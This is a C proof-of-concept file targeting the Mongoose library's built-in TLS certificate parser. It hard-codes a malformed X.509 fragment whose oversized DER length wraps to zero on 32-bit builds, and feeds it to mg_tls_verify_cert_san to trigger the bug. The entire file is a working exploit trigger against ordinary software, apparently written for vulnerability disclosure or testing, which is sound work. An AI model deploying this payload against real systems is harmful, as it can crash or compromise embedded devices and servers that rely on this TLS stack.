#include <stdio.h>
#include <stdint.h>

#define MG_TLS MG_TLS_BUILTIN
#include "mongoose.c"

int main() {
    if (sizeof(size_t) != 4) {
        printf("poc requires 32-bit compilation to overflow size_t.\n");
        return 1;
    }

    // Malicious X.509 Certificate Payload Fragment
    // 0x30, 0x06 = Outer Sequence, valid length of 6 bytes
    // 0x30 = Inner Sequence
    // 0x84, 0xFF, 0xFF, 0xFF, 0xFA = Length of 4,294,967,290
    //
    // header_len (6) + len (4294967290) = 0 on 32-bit systems.
    uint8_t malicious_cert[] = {
        0x30, 0x06,
        0x30, 0x84, 0xFF, 0xFF, 0xFF, 0xFA
    };

    struct mg_addr dummy_ip = {0};
  
    mg_tls_verify_cert_san(malicious_cert, sizeof(malicious_cert), "localhost", &dummy_ip);

    printf("This line will never execute\n");
    return 0;
}
